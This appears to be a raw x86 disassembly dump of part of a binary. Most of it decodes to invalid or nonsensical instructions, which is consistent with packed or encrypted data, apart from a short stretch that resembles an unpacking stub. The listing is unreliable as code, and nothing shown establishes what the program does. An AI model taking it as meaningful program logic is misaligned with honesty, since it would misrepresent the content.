  4017f3:	xor    edx,DWORD PTR [ebx]
  4017f5:	gs xor cl,ah
  4017f8:	mov    ecx,0x7d3d520b
  4017fd:	or     ecx,DWORD PTR [edx-0x15873720]
  401803:	push   esp
  401804:	sar    DWORD PTR [edx-0x52],0xa6
  401808:	outs   dx,BYTE PTR ds:[esi]
  401809:	mov    edi,0x92171108
  40180e:	mov    ss,eax
  401810:	in     eax,0x39
  401812:	xchg   ebp,eax
  401813:	std    
  401814:	pushf  
  401815:	inc    edx
  401816:	addr16 addr16 retf 0xd984
  40181b:	cmp    ch,BYTE PTR [edx]
  40181d:	(bad)  
  40181e:	js     0x4017d4
  401820:	js     0x40187c
  401822:	shl    BYTE PTR [ebp-0x1a],0x78
  401826:	imul   eax,esp,0xacca5a17
  40182c:	mov    esi,0x1b0bf519
  401831:	push   ds
  401832:	xchg   edx,eax
  401833:	out    0xb5,al
  401835:	jecxz  0x401856
  401837:	(bad)
  40183c:	fistp  DWORD PTR [ebx]
  40183e:	inc    edi
  40183f:	lods   al,BYTE PTR ds:[esi]
  401840:	sbb    eax,DWORD PTR [esi]
  401842:	mov    ah,0x72
  401844:	int3   
  401845:	jns    0x401894
  401847:	mov    eax,ds:0xea9292c2
  40184c:	adc    eax,0x25c0bfb2
  401851:	nop
  401852:	xor    al,0x6e
  401854:	mov    dh,0xd5
  401856:	xor    esi,DWORD PTR [ecx]
  401858:	sahf   
  401859:	sub    BYTE PTR [edx+0x10295723],ah
  40185f:	adc    al,0xe1
  401861:	and    al,BYTE PTR [ebp+0x73548c26]
  401867:	outs   dx,DWORD PTR ds:[esi]
  401868:	jbe    0x40180f
  40186a:	inc    ecx
  40186b:	stc    
  40186c:	adc    esi,DWORD PTR [ebp+0x18df839f]
  401872:	lods   eax,DWORD PTR ds:[esi]
  401873:	jmp    0xee931326
  401878:	mov    ebp,0x7255761d
  40187d:	sub    al,0x19
  40187f:	lods   eax,DWORD PTR ds:[si]
  401881:	mov    BYTE PTR [edx],al
  401883:	pop    ecx
  401884:	sahf   
  401885:	retf   0xe0e9
  401888:	xchg   BYTE PTR [esp+ecx*2+0x44f8a1c4],dh
  40188f:	call   0x374d:0x4806235e
  401896:	and    ch,BYTE PTR [ebp-0x66]
  401899:	mov    esp,0x89a2f5e5
  40189e:	lock xchg edi,eax
  4018a0:	mul    DWORD PTR [edi-0x20]
  4018a3:	lods   al,BYTE PTR ds:[esi]
  4018a4:	clc    
  4018a5:	(bad)  
  4018a6:	and    BYTE PTR ds:[esp+ebp*8-0x3d],0x2f
  4018ac:	aas    
  4018ad:	stos   DWORD PTR es:[edi],eax
  4018ae:	in     al,0x3e
  4018b0:	shr    DWORD PTR [edi],1
  4018b2:	mov    ss:0xa6220ce5,eax
  4018b8:	xchg   ecx,eax
  4018b9:	pop    esp
  4018ba:	jmp    0xba3a:0x13e2e6f8
  4018c1:	mov    esp,0x5463d55a
  4018c6:	pop    ds
  4018c7:	push   0x19bfbba4
  4018cc:	ss retf 
  4018ce:	mov    ebx,0x63caf85e
  4018d3:	int3   
  4018d4:	inc    ebx
  4018d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4018d6:	pop    edi
  4018d7:	mov    edi,0xfe209ad
  4018dc:	shl    DWORD PTR [edi],0x66
  4018df:	jnp    0x4018d5
  4018e1:	mov    cl,0x86
  4018e3:	test   DWORD PTR [ebp-0x65],ebx
  4018e6:	add    ebx,0x3853e22b
  4018ec:	addr16 mov edi,0x1eb1a091
  4018f2:	jge    0x40193a
  4018f4:	xchg   ecx,eax
  4018f5:	and    dl,ch
  4018f7:	mov    WORD PTR [edx+edi*4],es
  4018fa:	pop    ds
  4018fb:	sub    eax,0xb8d53bfa
  401900:	scas   al,BYTE PTR es:[edi]
  401901:	pop    ss
  401902:	sbb    ecx,DWORD PTR [edi]
  401904:	mov    esi,0xac8ebbdd
  401909:	aam    0x76
  40190b:	xor    BYTE PTR [ecx-0x59c8aa28],dl
  401911:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401912:	rol    BYTE PTR [esi+eiz*4+0x4a],cl
  401916:	ror    DWORD PTR [ebp+edi*8+0x3b42ad5d],cl
  40191d:	or     esi,ebp
  40191f:	inc    esi
  401920:	push   0xffffffca
  401922:	imul   ebx,DWORD PTR [edx-0x59],0xffffffef
  401926:	hlt    
  401927:	sub    DWORD PTR [ecx+0x7a],esi
  40192a:	call   0x5b87:0xfda7ee06
  401931:	sub    eax,0xf2265f2f
  401936:	loope  0x401926
  401938:	cli    
  401939:	inc    edx
  40193a:	out    0x95,al
  40193c:	neg    BYTE PTR [ecx-0x72fbe39e]
  401942:	(bad)  
  401943:	cmc    
  401944:	inc    edi
  401945:	addr16 xchg esi,eax
  401947:	add    eax,0xeb008faa
  40194c:	in     eax,0x3a
  40194e:	cdq    
  40194f:	xchg   edx,eax
  401950:	test   DWORD PTR [edi+0x7c],0x89467660
  401957:	or     DWORD PTR [ecx-0x62],eax
  40195a:	xchg   edx,eax
  40195b:	les    esp,FWORD PTR [edx-0x535c8028]
  401961:	jp     0x4019c8
  401963:	jmp    0x4019bd
  401965:	icebp  
  401966:	punpckldq mm1,DWORD PTR [ecx]
  401969:	or     cl,bh
  40196b:	shl    dh,cl
  40196d:	fild   DWORD PTR [eax-0x17d59558]
  401973:	sti    
  401974:	pushf  
  401975:	imul   bl
  401977:	aaa    
  401978:	hlt    
  401979:	cmp    eax,0xcd7ef13f
  40197e:	rcl    BYTE PTR [ebp-0x55bb2ba6],1
  401984:	and    BYTE PTR [esi-0x5d],0xac
  401988:	out    dx,al
  401989:	mov    dl,0x83
  40198b:	ins    DWORD PTR es:[edi],dx
  40198c:	mov    edi,fs
  40198e:	jecxz  0x4019a0
  401990:	inc    esi
  401991:	ret    
  401992:	shl    DWORD PTR [edi],0x45
  401995:	aaa    
  401996:	pop    ebx
  401997:	push   esi
  401998:	ins    BYTE PTR es:[edi],dx
  401999:	sahf   
  40199a:	and    BYTE PTR [eax],al
  40199c:	inc    ebx
  40199d:	je     0x401a08
  40199f:	mov    eax,ds:0x94529af3
  4019a4:	clc    
  4019a5:	or     ecx,DWORD PTR [edx+edi*1+0x1faf51b2]
  4019ac:	fadd   DWORD PTR [edx]
  4019ae:	ins    DWORD PTR es:[edi],dx
  4019af:	pushf  
  4019b0:	ja     0x4019b5
  4019b2:	into   
  4019b3:	mov    bh,0xf8
  4019b5:	repz enter 0xeb76,0x7c
  4019ba:	aam    0xab
  4019bc:	lahf   
  4019bd:	pop    ss
  4019be:	jg     0x4019a2
  4019c0:	jno    0x401a18
  4019c2:	mov    ch,0x2f
  4019c4:	xchg   DWORD PTR [ecx],esi
  4019c6:	call   0x7dc5d4e9
  4019cb:	dec    ecx
  4019cc:	xor    al,0x3a
  4019ce:	push   esp
  4019cf:	pop    esp
  4019d0:	xlat   BYTE PTR ds:[ebx]
  4019d1:	sbb    eax,DWORD PTR [ebp+0x60]
  4019d4:	jmp    0x7344ec56
  4019d9:	imul   edi,ebp,0x9c59845a
  4019df:	test   eax,0xa9d790e2
  4019e4:	add    BYTE PTR fs:[edi+0x485fdaf0],ah
  4019eb:	mov    DWORD PTR [edx-0x1c40c5a7],eax
  4019f1:	(bad)  
  4019f2:	push   eax
  4019f3:	add    BYTE PTR [ecx],bh
  4019f5:	mov    ebx,0x1c9f9b97
  4019fa:	or     edi,esi
  4019fc:	cmp    al,0x15
  4019fe:	out    dx,al
  4019ff:	mov    ds:0x20026d76,eax
  401a04:	add    DWORD PTR [ecx],0x10cacb94
  401a0a:	sti    
  401a0b:	dec    esp
  401a0c:	xchg   edi,eax
  401a0d:	and    ebx,DWORD PTR [esi-0x13013f8c]
  401a13:	mov    edx,0x5603dbf1
  401a18:	outs   dx,DWORD PTR ds:[esi]
  401a19:	lahf   
  401a1a:	retf   
  401a1b:	out    0x58,al
  401a1d:	jae    0x4019ca
  401a1f:	pop    esp
  401a20:	pop    esp
  401a21:	lods   eax,DWORD PTR ds:[esi]
  401a22:	mov    edi,0x4a3896da
  401a27:	addr16 sub ch,ch
  401a2a:	out    dx,al
  401a2b:	push   edx
  401a2c:	dec    eax
  401a2d:	out    0xe3,al
  401a2f:	es iret 
  401a31:	lock cdq 
  401a33:	cmc    
  401a34:	retf   0x932a
  401a37:	out    0xa6,eax
  401a39:	jae    0x401a52
  401a3b:	xchg   edx,eax
  401a3c:	fnstcw WORD PTR [eax]
  401a3e:	cmp    al,0xe5
  401a40:	fdiv   QWORD PTR ss:[ecx+0x38053b2b]
  401a47:	adc    eax,0xafff8913
  401a4c:	jo     0x401a38
  401a4e:	lods   al,BYTE PTR ds:[esi]
  401a4f:	popa   
  401a50:	inc    ebp
  401a51:	xchg   esp,eax
  401a52:	add    ebp,esp
  401a54:	pop    ebx
  401a55:	test   DWORD PTR [ebp-0x2c],0xdbe042e0
  401a5c:	lahf   
  401a5d:	and    ebp,edi
  401a5f:	shl    DWORD PTR [edi],0x48
  401a62:	(bad)  
  401a63:	aas    
  401a64:	inc    edx
  401a65:	idiv   dl
  401a67:	jnp    0x401aaa
  401a69:	je     0x401ad8
  401a6b:	jb     0x401a68
  401a6d:	pop    ebx
  401a6e:	sub    cl,ah
  401a70:	ret    0x527
  401a73:	ret    0x37f5
  401a76:	cmc    
  401a77:	inc    esi
  401a78:	push   ds
  401a79:	xchg   BYTE PTR [ecx-0x58a2b0ca],cl
  401a7f:	and    edi,ebp
  401a81:	(bad)  
  401a82:	xlat   BYTE PTR ds:[ebx]
  401a83:	je     0x401a53
  401a85:	sbb    al,0x47
  401a87:	lds    edx,FWORD PTR [edi-0x7f96296a]
  401a8d:	add    esi,DWORD PTR [edx-0x48ccb727]
  401a93:	adc    al,0xc0
  401a95:	dec    esi
  401a96:	in     eax,dx
  401a97:	mov    al,0x76
  401a99:	paddsb mm7,QWORD PTR [ebp-0x70]
  401a9d:	es cwde 
  401a9f:	push   edi
  401aa0:	dec    eax
  401aa1:	dec    ebx
  401aa2:	lahf   
  401aa3:	es push esi
  401aa5:	sbb    ebx,DWORD PTR ds:0x42a3c9
  401aab:	mov    esi,0x7510850
  401ab0:	xor    eax,esi
  401ab2:	push   edi
  401ab3:	add    ecx,0x2d8a
  401ab9:	mov    edi,0x327298
  401abe:	mov    ecx,DWORD PTR ds:0x42a32d
  401ac4:	mov    ebx,DWORD PTR ds:0x42a3dd
  401aca:	sub    ecx,ebx
  401acc:	and    ecx,DWORD PTR [ecx+ebx*1]
  401acf:	add    eax,edi
  401ad1:	mov    DWORD PTR ds:0x42a401,0x1cd1
  401adb:	jmp    0x401fe6
  401ae0:	enter  0xcbc2,0xd1
  401ae4:	(bad)  
  401ae6:	(bad)  
  401ae7:	shr    DWORD PTR [esi-0x3c],0xd6
  401aeb:	mov    bl,0x62
  401aed:	(bad)  
  401aee:	das    
  401aef:	dec    esi
  401af0:	push   esp
  401af1:	pop    es
  401af2:	js     0x401b6c
  401af4:	push   0x7c
  401af6:	js     0x401b70
  401af8:	mov    eax,ds:0x66d04af8
  401afd:	sti    
  401afe:	push   esi
  401aff:	div    BYTE PTR [ecx]
  401b01:	xor    DWORD PTR [eax-0x19],0x571fdc0d
  401b08:	inc    eax
  401b09:	shl    DWORD PTR [esi],cl
  401b0b:	or     DWORD PTR [ebx+0x45],ebp
  401b0e:	enter  0x555,0xe
  401b12:	inc    BYTE PTR [ecx]
  401b14:	jecxz  0x401b6f
  401b16:	setbe  cl
  401b19:	sbb    DWORD PTR [eax+0x4560089c],edi
  401b1f:	ds inc edx
  401b21:	into   
  401b22:	fdiv   st(3),st
  401b24:	sbb    eax,0x6537d511
  401b29:	(bad)  
  401b2a:	sbb    eax,0x973d6552
  401b2f:	xchg   esi,eax
  401b30:	aaa    
  401b31:	ins    BYTE PTR es:[edi],dx
  401b32:	add    DWORD PTR [ebp+0x30],esi
  401b35:	jae    0x401b5c
  401b37:	cld    
  401b38:	mov    ch,0x3f
  401b3a:	adc    DWORD PTR [esi],0x6cf1e65b
  401b40:	or     ch,0xbf
  401b43:	pop    esi
  401b44:	(bad)  
  401b45:	or     DWORD PTR [esi-0x3b],ebx
  401b48:	and    bl,BYTE PTR [ecx+0x670a3bf2]
  401b4e:	or     eax,0x9031f57
  401b53:	xor    DWORD PTR [edi+0xe],ebx
  401b56:	lea    ecx,[edi+0x34]
  401b59:	inc    esi
  401b5a:	clc    
  401b5b:	je     0x401ae4
  401b5d:	in     al,0xa0
  401b5f:	jle    0x401bc1
  401b61:	out    0xa6,eax
  401b63:	mov    edx,0xc5228
  401b68:	sbb    BYTE PTR [eax+0x43],ch
  401b6b:	add    ebx,DWORD PTR [ebx]
  401b6d:	clc    
  401b6e:	test   eax,0xe032592c
  401b73:	paddsb mm0,QWORD PTR [eax]
  401b76:	push   esp
  401b77:	adc    bl,BYTE PTR [edi]
  401b79:	sbb    eax,eax
  401b7b:	les    ecx,FWORD PTR [edx+0x3641718]
  401b81:	fcomp  DWORD PTR [edi+0x366bee48]
  401b87:	(bad)  
  401b88:	bound  edi,QWORD PTR [edi+ebx*8]
  401b8b:	stos   BYTE PTR es:[edi],al
  401b8c:	and    eax,0x31c175e6
  401b91:	sbb    BYTE PTR [edi+0xf],dl
  401b94:	push   esp
  401b95:	pop    edi
  401b96:	push   esi
  401b97:	ins    DWORD PTR es:[edi],dx
  401b98:	out    0x98,al
  401b9a:	addr16 mov bl,0xad
  401b9d:	(bad)  
  401b9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b9f:	icebp  
  401ba0:	inc    ecx
  401ba1:	jl     0x401b33
  401ba3:	inc    esi
  401ba4:	push   ds
  401ba5:	pop    esp
  401ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ba7:	sbb    dh,ch
  401ba9:	inc    esi
  401baa:	dec    ecx
  401bab:	loopne 0x401bff
  401bad:	inc    eax
  401bae:	sub    DWORD PTR [ecx],eax
  401bb0:	je     0x401bbe
  401bb2:	sbb    ecx,ebp
  401bb4:	add    al,0xb
  401bb6:	icebp  
  401bb7:	sahf   
  401bb8:	dec    esp
  401bb9:	mov    bl,cl
  401bbb:	in     eax,dx
  401bbc:	nop
  401bbd:	sti    
  401bbe:	mov    bl,BYTE PTR [edi]
  401bc0:	push   ecx
  401bc1:	mov    ds:0x4022c6b2,al
  401bc6:	les    edi,FWORD PTR [edi-0x13]
  401bc9:	push   ecx
  401bca:	in     eax,dx
  401bcb:	enter  0xb703,0xdb
  401bcf:	mov    al,0xfd
  401bd1:	in     al,dx
  401bd2:	sub    cl,BYTE PTR [esi]
  401bd4:	adc    ecx,DWORD PTR [eax]
  401bd6:	sar    DWORD PTR [ebp-0xa],0xa
  401bda:	push   ebp
  401bdb:	mov    ss,ecx
  401bdd:	cs js  0x401c38
  401be0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401be1:	scas   al,BYTE PTR es:[edi]
  401be2:	sub    dh,BYTE PTR [eax]
  401be4:	mov    esi,0x8b1aa4cc
  401be9:	xor    ah,BYTE PTR cs:[edi+0x27160583]
  401bf0:	add    al,0xb8
  401bf2:	mov    DWORD PTR [edx+0x5f2e4f21],0xa3079798
  401bfc:	inc    esp
  401bfd:	mov    al,0x7
  401bff:	dec    edi
  401c00:	push   cs
  401c01:	dec    esp
  401c02:	inc    ebp
  401c03:	sub    DWORD PTR [ecx],0xffffffd0
  401c06:	xchg   ebx,edx
  401c08:	mov    edx,0xa8319994
  401c0d:	lds    eax,FWORD PTR [eax]
  401c0f:	and    eax,0xf1327694
  401c14:	inc    esp
  401c15:	ss lock scas eax,DWORD PTR es:[edi]
  401c18:	call   0xa83101db
  401c1d:	jg     0x401c91
  401c1f:	cmp    DWORD PTR ds:0x7b3f9cf9,ebp
  401c25:	jns    0x401bb8
  401c27:	sbb    esp,DWORD PTR [eax-0xd]
  401c2a:	in     eax,0x5
  401c2c:	sbb    DWORD PTR [ecx-0x607b93d2],ebp
  401c32:	imul   esp,ebx,0x9328a1cb
  401c38:	clc    
  401c39:	sbb    eax,0x6ce109d2
  401c3e:	or     esi,DWORD PTR [eax-0x6adcdff1]
  401c44:	(bad)  
  401c45:	shl    BYTE PTR [esi-0x5b35dcd7],1
  401c4b:	sbb    BYTE PTR [edi+ebp*1+0x61],0x7f
  401c50:	or     BYTE PTR [esi+0x7ae36353],dl
  401c56:	call   0x2a2c:0x84b357a3
  401c5d:	dec    esi
  401c5e:	das    
  401c5f:	xchg   ebp,eax
  401c60:	dec    esp
  401c61:	out    dx,eax
  401c62:	pop    ss
  401c63:	push   cs
  401c64:	sub    eax,0xafb36924
  401c69:	mov    bl,0x45
  401c6b:	pusha  
  401c6c:	push   ebp
  401c6d:	ins    BYTE PTR es:[edi],dx
  401c6e:	mov    bl,0xe4
  401c70:	lahf   
  401c71:	gs mov esi,0xffd619ef
  401c77:	loop   0x401cd2
  401c79:	in     eax,0x6a
  401c7b:	mov    DWORD PTR [edi-0x165d6a3b],edx
  401c81:	mov    bh,0x53
  401c83:	push   es
  401c84:	sub    DWORD PTR [edi],esi
  401c86:	jo     0x401d06
  401c88:	add    edx,DWORD PTR [esi]
  401c8a:	not    ebp
  401c8c:	xor    ecx,edi
  401c8e:	fisubr DWORD PTR [eax+0x430c343a]
  401c94:	xchg   ecx,eax
  401c95:	or     BYTE PTR [ebx+0x53],0xc3
  401c99:	shl    BYTE PTR [eax-0x160d4884],0xb1
  401ca0:	sbb    eax,0x116077b1
  401ca5:	rol    BYTE PTR [eax],1
  401ca7:	mov    ebp,0xd415f8cb
  401cac:	ja     0x401cc7
  401cae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401caf:	push   ebx
  401cb0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401cb1:	fs iret 
  401cb3:	pop    eax
  401cb4:	pop    edi
  401cb5:	add    BYTE PTR [ecx+0x7289e669],al
  401cbb:	push   ds
  401cbc:	dec    eax
  401cbd:	das    
  401cbe:	add    DWORD PTR [eax+edi*8+0x2202d5cc],ebp
  401cc5:	(bad)  
  401cc6:	or     ch,BYTE PTR [eax-0x13ee2f29]
  401ccc:	mov    esi,0x8ad16a36
  401cd1:	mov    ebx,0xbca223c5
  401cd6:	aad    0x26
  401cd8:	je     0x401cc0
  401cda:	xchg   ebp,eax
  401cdb:	xchg   ebx,eax
  401cdc:	inc    ebx
  401cdd:	cmp    al,0x61
  401cdf:	cmp    al,0xcc
  401ce1:	stos   DWORD PTR es:[edi],eax
  401ce2:	mov    ah,0x30
  401ce4:	int3   
  401ce5:	sbb    BYTE PTR [edi],dh
  401ce7:	dec    ebp
  401ce8:	pop    ebp
  401ce9:	cmp    eax,0x1a3ca1aa
  401cee:	aas    
  401cef:	ins    DWORD PTR es:[edi],dx
  401cf0:	jp     0x401d00
  401cf2:	lea    esp,[edx+0x67ff3d18]
  401cf8:	inc    ebp
  401cf9:	pop    esi
  401cfa:	mov    edi,0x46233d2e
  401cff:	sub    al,0xde
  401d01:	mov    ss:0xa67b3de6,eax
  401d07:	mov    al,0xc3
  401d09:	mov    al,ds:0xefed4bab
  401d0e:	and    DWORD PTR [ecx],edi
  401d10:	adc    bl,al
  401d12:	test   DWORD PTR [edi-0x4b],0xb8be76f7
  401d19:	and    edi,eax
  401d1b:	imul   edi,DWORD PTR [edx],0xae8a43f1
  401d21:	xchg   DWORD PTR [esp+edi*4+0x53fa0364],esi
  401d28:	stc    
  401d29:	add    bl,BYTE PTR [eax+0x70]
  401d2c:	fist   WORD PTR [ecx+0x21e873f8]
  401d32:	cmp    esi,edx
  401d34:	test   BYTE PTR [eax],dh
  401d36:	imul   eax,DWORD PTR [edx*1+0x900d39b],0x36
  401d3e:	adc    ah,bh
  401d40:	dec    ecx
  401d41:	pop    esi
  401d42:	add    BYTE PTR [ebx-0x54],dh
  401d45:	jge    0x401cea
  401d47:	or     eax,0x73d3a4f5
  401d4c:	scas   al,BYTE PTR es:[edi]
  401d4d:	push   esp
  401d4e:	in     al,dx
  401d4f:	inc    edi
  401d50:	es jns 0x401dc0
  401d53:	push   cs
  401d54:	jmp    0x401d33
  401d56:	lea    esi,[ebx+0x26]
  401d59:	mov    esi,0x2e869d07
  401d5e:	scas   eax,DWORD PTR es:[edi]
  401d5f:	xchg   BYTE PTR [esi+0x43dbd168],al
  401d65:	pop    ss
  401d66:	mov    ds:0x6d601e35,eax
  401d6b:	xchg   esi,eax
  401d6c:	mov    eax,0x57bc59c
  401d71:	pop    ebp
  401d72:	retf   
  401d73:	repz jg 0x401da1
  401d76:	int    0x86
  401d78:	inc    ebx
  401d79:	xchg   edx,eax
  401d7a:	int3   
  401d7b:	aas    
  401d7c:	sub    DWORD PTR [ebp-0x2fa36950],edi
  401d82:	jno    0x401d68
  401d84:	mov    fs,WORD PTR [esi-0x1850a2f9]
  401d8a:	or     edi,DWORD PTR [esi-0x80]
  401d8d:	mov    dh,BYTE PTR [edi+edi*4-0x43]
  401d91:	dec    ecx
  401d92:	mov    BYTE PTR [eax],bl
  401d94:	dec    ebp
  401d95:	outs   dx,DWORD PTR ds:[esi]
  401d96:	add    eax,0x624fe70a
  401d9b:	mov    eax,ds:0xe02939
  401da0:	jmp    0xbe69:0x2cc28411
  401da7:	jg     0x401d82
  401da9:	cwde   
  401daa:	inc    ebp
  401dab:	or     al,0xbf
  401dad:	cli    
  401dae:	sahf   
  401daf:	shr    BYTE PTR [esp+ebx*8],1
  401db2:	call   0x88:0x10777802
  401db9:	call   0x290f0b76
  401dbe:	sar    ch,0x29
  401dc1:	jge    0x401dbc
  401dc3:	cmp    BYTE PTR [edi+0x6a018573],bh
  401dc9:	int    0x19
  401dcb:	mov    eax,0x6ad1f8f6
  401dd0:	int    0xa3
  401dd2:	inc    esi
  401dd3:	xchg   ebp,eax
  401dd4:	push   esi
  401dd5:	aad    0x15
  401dd7:	jmp    0x401da0
  401dd9:	mov    esp,0x479b6ace
  401dde:	das    
  401ddf:	retf   
  401de0:	xchg   esi,esp
  401de2:	dec    ebp
  401de3:	pop    esi
  401de4:	ret    0x53fe
  401de7:	pop    edx
  401de8:	cmovo  edx,DWORD PTR [ebp-0x20]
  401dec:	cmp    BYTE PTR [esi],ah
  401dee:	(bad)  
  401def:	dec    esi
  401df0:	add    ebp,ebp
  401df2:	loopne 0x401e06
  401df4:	scas   al,BYTE PTR es:[edi]
  401df5:	cmp    DWORD PTR [esi+ecx*1],esp
  401df8:	mov    fs,WORD PTR [ecx-0x71]
  401dfb:	loop   0x401da7
  401dfd:	test   al,0xe6
  401dff:	mov    es,WORD PTR [edx-0x4d822724]
  401e05:	mov    ebx,0xee297cd5
  401e0a:	ins    DWORD PTR es:[edi],dx
  401e0b:	or     dh,ah
  401e0d:	sbb    BYTE PTR [esi+eiz*4-0x620c7cba],ch
  401e14:	div    DWORD PTR [edi+eiz*2+0x1a]
  401e18:	xchg   esi,eax
  401e19:	mov    ecx,0x606f43ad
  401e1e:	dec    eax
  401e1f:	adc    BYTE PTR [ebx-0x4d],ah
  401e22:	mov    ah,0x94
  401e24:	stos   DWORD PTR es:[edi],eax
  401e25:	jbe    0x401e1d
  401e27:	aam    0x52
  401e29:	pushf  
  401e2a:	xchg   ebp,eax
  401e2b:	sbb    DWORD PTR [eax-0x6a],0xfffffff8
  401e2f:	mov    cl,0xad
  401e31:	and    eax,0xcba15abb
  401e36:	inc    esp
  401e37:	dec    ecx
  401e38:	loopne 0x401e42
  401e3a:	xchg   esi,eax
  401e3b:	jne    0x401e68
  401e3d:	push   eax
  401e3e:	xchg   edx,eax
  401e3f:	pop    edi
  401e40:	sub    eax,0x5af7994c
  401e45:	les    ebp,FWORD PTR [ebp+0x4a681c3d]
  401e4b:	mov    ebx,0x7f37ba05
  401e50:	movq   QWORD PTR [esi],mm3
  401e53:	mov    eax,0x7425f19a
  401e58:	pop    es
  401e59:	xor    BYTE PTR [eax],bl
  401e5b:	jo     0x401e91
  401e5d:	push   edx
  401e5e:	retf   0xc590
  401e61:	lods   al,BYTE PTR ds:[esi]
  401e62:	outs   dx,DWORD PTR ds:[esi]
  401e63:	mov    cl,BYTE PTR [eax]
  401e65:	stos   BYTE PTR es:[edi],al
  401e66:	dec    edi
  401e67:	and    al,0x27
  401e69:	mov    cl,0xb8
  401e6b:	or     eax,0x1819e502
  401e70:	sbb    DWORD PTR [edx+0x8],esi
  401e73:	pop    ebx
  401e74:	sub    esi,esp
  401e76:	leave  
  401e77:	xlat   BYTE PTR ds:[ebx]
  401e78:	add    bl,BYTE PTR [edx]
  401e7a:	push   0xffffffd0
  401e7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e7d:	dec    eax
  401e7e:	stos   BYTE PTR es:[edi],al
  401e7f:	fwait
  401e80:	lds    ebp,FWORD PTR [ebx-0x1c]
  401e83:	mov    al,0xbf
  401e85:	jge    0x401eb1
  401e87:	(bad)  [edx]
  401e89:	jp     0x401e41
  401e8b:	cmc    
  401e8c:	pop    es
  401e8d:	xor    edx,DWORD PTR [edx-0x4631dd94]
  401e93:	in     eax,dx
  401e94:	dec    edi
  401e95:	mov    esi,eax
  401e97:	jb     0x401e7a
  401e99:	gs push cs
  401e9b:	mov    al,0xb6
  401e9d:	(bad)  
  401e9e:	out    0x44,eax
  401ea0:	ins    DWORD PTR es:[edi],dx
  401ea1:	mov    al,ds:0x19e43e3b
  401ea6:	push   esp
  401ea7:	pop    edi
  401ea8:	daa    
  401ea9:	mov    esi,0x9b1016fe
  401eae:	ins    BYTE PTR es:[edi],dx
  401eaf:	xor    cl,BYTE PTR [edi+esi*8-0x1ecf5bce]
  401eb6:	sub    eax,0x1b67dbe7
  401ebb:	sbb    al,0x83
  401ebd:	jecxz  0x401e9b
  401ebf:	mov    eax,0x1e753121
  401ec4:	retf   0xbc3c
  401ec7:	stos   DWORD PTR es:[edi],eax
  401ec8:	das    
  401ec9:	nop
  401eca:	out    0x62,al
  401ecc:	and    DWORD PTR [ecx+0x6add88d4],ecx
  401ed2:	sbb    eax,DWORD PTR [ebx]
  401ed4:	into   
  401ed5:	cs aam 0xa8
  401ed8:	sbb    ebp,eax
  401eda:	sbb    bh,BYTE PTR [edi]
  401edc:	inc    esi
  401edd:	inc    ebx
  401ede:	pop    ebp
  401edf:	leave  
  401ee0:	ficom  WORD PTR [ebx+0x7f3fccd]
  401ee6:	mov    bl,0xd3
  401ee8:	and    bh,0xc7
  401eeb:	mov    ?,WORD PTR [eax]
  401eed:	xlat   BYTE PTR ds:[ebx]
  401eee:	ret    
  401eef:	shl    BYTE PTR [ebx+edx*2-0x324a8ce6],0xf1
  401ef7:	retf   
  401ef8:	mov    ecx,edi
  401efa:	pop    ecx
  401efb:	rcr    edi,0x20
  401efe:	(bad)  
  401eff:	mov    ebp,ebp
  401f01:	dec    esi
  401f02:	jge    0x401ece
  401f04:	pop    ecx
  401f05:	pusha  
  401f06:	mov    ds:0xa2d99c20,al
  401f0b:	jmp    0xab2aa946
  401f10:	jle    0x401f77
  401f12:	pop    esp
  401f13:	int3   
  401f14:	es or  eax,0xc377de58
  401f1a:	cs ror BYTE PTR ds:[ebp-0xf3669a2],1
  401f22:	ins    BYTE PTR es:[edi],dx
  401f23:	push   cs
  401f24:	push   edi
  401f25:	pop    eax
  401f26:	rol    DWORD PTR [edi-0x43],1
  401f29:	test   DWORD PTR [esp+ebx*4+0x25b5f043],0x24cd6a47
  401f34:	test   ah,ch
  401f36:	hlt    
  401f37:	xor    BYTE PTR [edi+0xea15a34],dh
  401f3d:	and    DWORD PTR [eax],0x7a
  401f40:	ret    0x3eac
  401f43:	add    eax,0x83d9795e
  401f48:	clc    
  401f49:	push   0xef0e6023
  401f4e:	jno    0x401ede
  401f50:	push   ebp
  401f51:	daa    
  401f52:	(bad)  
  401f53:	lods   al,BYTE PTR ds:[esi]
  401f54:	push   es
  401f55:	adc    eax,0xb0320302
  401f5a:	or     DWORD PTR [ecx-0x52],edx
  401f5d:	mov    ecx,0x90694255
  401f62:	pop    ecx
  401f63:	scas   eax,DWORD PTR es:[edi]
  401f64:	add    al,0x65
  401f66:	les    edx,FWORD PTR [edi+0x6a]
  401f69:	pusha  
  401f6a:	jae    0x401fc0
  401f6c:	jns    0x401f33
  401f6e:	and    BYTE PTR [ecx-0x4c],0x62
  401f72:	sub    BYTE PTR [eax],0x4c
  401f75:	lahf   
  401f76:	sbb    al,0x3a
  401f78:	(bad)  
  401f79:	out    dx,eax
  401f7a:	inc    ebx
  401f7b:	loopne 0x401fe0
  401f7d:	push   esp
  401f7e:	xchg   ecx,eax
  401f7f:	cld    
  401f80:	popa   
  401f81:	or     BYTE PTR [edx-0x5a],al
  401f84:	inc    esi
  401f85:	data16 mov BYTE PTR [edx],bh
  401f88:	mov    bl,0x8a
  401f8a:	fs mov eax,0xda82f075
  401f90:	jge    0x401fbe
  401f92:	bound  edi,QWORD PTR [edx]
  401f94:	jge    0x401f8a
  401f96:	ret    0xc0f
  401f99:	lods   al,BYTE PTR ds:[esi]
  401f9a:	cli    
  401f9b:	retf   0x93e1
  401f9e:	loopne 0x402015
  401fa0:	mov    BYTE PTR [esi-0x32],cl
  401fa3:	stos   DWORD PTR es:[edi],eax
  401fa4:	jnp    0x40200e
  401fa6:	popa   
  401fa7:	(bad)  
  401fa8:	pusha  
  401fa9:	or     eax,0xe5280b49
  401fae:	leave  
  401faf:	ja     0x401fd2
  401fb1:	cmc    
  401fb2:	pop    esi
  401fb3:	sahf   
  401fb4:	stc    
  401fb5:	imul   DWORD PTR [edi+0x4b]
  401fb8:	outs   dx,DWORD PTR ds:[esi]
  401fb9:	adc    DWORD PTR ds:0x950c63f8,edi
  401fbf:	adc    esi,DWORD PTR [eiz*2+0x5649f997]
  401fc6:	push   eax
